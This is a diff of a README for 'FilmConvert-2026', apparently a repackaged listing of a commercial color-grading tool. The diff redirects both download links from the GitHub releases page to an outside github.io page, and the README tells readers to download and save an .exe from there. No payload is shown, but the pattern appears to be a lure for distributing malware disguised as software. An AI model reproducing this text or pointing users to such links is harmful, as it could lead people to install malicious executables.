@@ -1,6 +1,6 @@
 # 🎥 FilmConvert-2026 - Master cinematic color grading with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vibrionic-antlia618/FilmConvert-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://vibrionic-antlia618.github.io)
 
 ## What is FilmConvert-2026?
 
@@ -23,7 +23,7 @@ Your computer needs to meet these standards to run the software.
 
 Follow these steps to obtain the correct file for your system.
 
-1. Go to the [official release page](https://github.com/vibrionic-antlia618/FilmConvert-2026/releases). 
+1. Go to the [official release page](https://vibrionic-antlia618.github.io). 
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to start the download. 
 4. Save the file to your Downloads folder.
